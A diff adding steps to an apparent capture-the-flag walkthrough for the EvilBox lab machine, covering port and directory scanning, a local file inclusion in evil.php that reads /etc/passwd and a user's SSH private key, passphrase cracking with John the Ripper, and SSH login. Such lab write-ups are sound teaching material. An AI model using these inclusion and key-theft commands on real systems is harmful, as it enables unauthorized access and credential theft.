@@ -22,3 +22,79 @@
 
 1. Set the EvilBox IP address to the environment variance  
     * `export IP=192.168.56.109`  
+
+## Reconnaissance
+1. Do portscan using Nmap  
+    * `sudo nmap -sC -sV -Pn -p- $IP -oN nmap_result.txt`  
+    ![nmap](./img/evilbox-server3.png)  
+        * -sC: Scan with default script
+        * -sV: Show software name and the version
+        * -Pn: Do not confirm communication before port scan (We have already confirmed the DC-2 IP address.)
+        * -p-: Scan all ports (from 0 to 65535 ports)
+        * -oN: Output the scan results to the specified file
+    * As we see the nmap result, we can attempt to access of 22 (SSH Service) and 80 (HTTP Service) ports.  
+
+1. Set the URL of the 80 port to the environment variance  
+    * `export URL="http://$IP:80/"`  
+
+1. Search accessible files  
+    * Use Gobuster  
+    ![Gobuster](./img/evilbox-server4.png)    
+        - `gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`  
+        - There is a "/secret" directory  
+
+1. Search the /secret directory  
+    * Use Gobuster  
+    ![Gobuster-secret](./img/evilbox-server5.png)  
+        - `gobuster dir -u $URL/secret -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`  
+        - We found the "evil.php" which is suspecious  
+    * Access to the evil.php from the web browser  
+    ![Evil-php](./img/evilbox-server6.png)  
+        - Unfortunately, the page does not show anything  
+
+1. Investigate the evil.php file  
+    * Use Wfuzz to find parameters  
+    ![evil-parameter](./img/evilbox-server7.png)  
+        - `wfuzz -u "$URL/secret/evil.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 0`  
+        - We found the evil.php parameter is "**command**"  
+    * See the /etc/passwd  
+    ![etc-passwd](./img/evilbox-server7-2.png)    
+        - "root" and "mowree" are allocated the /bin/bash shell  
+
+1. Reveal the evil.php source code  
+    * Use php://filter technique  
+        - `curl $URL/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php`  
+    * Decode the encoded strings  
+    ![Evil-decode](./img/evilbox-server8.png)  
+        - `echo PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg== | base64 -d`  
+        - We found the parameter is a file name  
+
+## Execution  
+1. Find SSH login information  
+    * From the Nmap result, 22 port is opened  
+        - The "mowree" could login to the SSH service  
+        - The .ssh direcotry might exist in the mowree's home directory  
+    * `curl $URL/secret/evil.php?command=/home/mowree/.ssh/id_rsa`  
+    ![RSA-Secret-key](./img/evilbox-server9.png)  
+
+1. Access to the SSH service  
+    * Make a id_rsa file and give it executable permission  
+    ![Make-id_rsa](./img/evilbox-server10-3.png)  
+    * `ssh mowree@$IP -i id_rsa`  
+        - Unfortunately, we can not log in to the SSH because we do not know the passphrase  
+
+1. Decrypt the passphrase  
+    * Modify ssh2john and output id_rsa as a passphrase_hash.txt  
+        - `sed -e 's/decodestring/decodebytes/g' /usr/share/john/ssh2john.py | python3 - id_rsa > passphrase_hash.txt`  
+    * Use John  
+    ![ssh-passphrase](./img/evilbox-server11.png)  
+        - `john --wordlist=/usr/share/wordlists/rockyou.txt passphrase_hash.txt`  
+        - The passphrase is "**unicorn**"  
+
+1. Access to the SSH service again  
+    * `ssh mowree@$IP -i id_rsa`  
+    ![Mowree-SSH](./img/evilbox-server12.png)  
+        - Password: **unicorn**  
+        - We can log in as a mowree user  
+
+       
